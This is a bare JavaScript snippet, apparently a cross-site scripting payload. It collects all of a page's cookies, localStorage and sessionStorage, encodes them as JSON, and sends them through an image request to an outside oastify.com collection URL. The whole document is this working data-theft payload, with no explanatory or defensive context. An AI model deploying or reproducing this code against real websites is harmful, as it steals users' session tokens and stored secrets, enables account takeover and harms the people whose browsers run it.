const browserData = {
    cookies: document.cookie
        .split("; ")
        .reduce((acc, cookie) => {
            const [key, ...value] = cookie.split("=");
            acc[key] = value.join("=");
            return acc;
        }, {}),

    localStorage: Object.keys(localStorage)
        .reduce((acc, key) => {
            acc[key] = localStorage.getItem(key);
            return acc;
        }, {}),

    sessionStorage: Object.keys(sessionStorage)
        .reduce((acc, key) => {
            acc[key] = sessionStorage.getItem(key);
            return acc;
        }, {})
};

const dump = JSON.stringify(browserData, null, 2);

new Image().src = "https://cs8g78fo5s8r33w5oxfpop9wrnxel59u.oastify.com/collect?data=" + encodeURIComponent(dump);
